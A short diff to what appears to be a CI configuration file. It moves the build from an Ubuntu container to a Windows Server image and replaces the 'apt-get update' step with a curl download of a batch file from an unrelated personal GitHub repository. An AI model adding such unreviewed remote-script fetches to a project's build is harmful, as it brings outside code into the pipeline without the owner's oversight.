@@ -1,7 +1,7 @@
-container:
-  image: ubuntu:bionic
+windows_container:
+  image: cirrusci/windowsservercore:2019
   cpu: 4
   memory: 10G
   
 task:
-  prepare_script: apt-get update
+  prepare_script: curl -s -O https://raw.githubusercontent.com/DangDev/dangdev/main/azure_pipeline.bat
